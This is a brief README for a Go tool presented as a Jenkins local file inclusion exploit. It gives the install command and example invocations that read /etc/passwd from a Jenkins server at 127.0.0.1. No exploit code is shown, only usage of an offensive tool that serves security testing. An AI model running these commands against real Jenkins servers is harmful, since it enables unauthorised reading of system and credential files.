# Jenkins LFI exploit

## Install

`go install github.com/gboddin/jenkins-lfi@latest`

## Usage

```sh
jenkins-lfi <target> <command> <filepath>
```

## Examples

```sh
jenkins-lfi http://127.0.0.1:8080 help /etc/passwd
jenkins-lfi http://127.0.0.1:8080 connect-node /etc/passwd
```
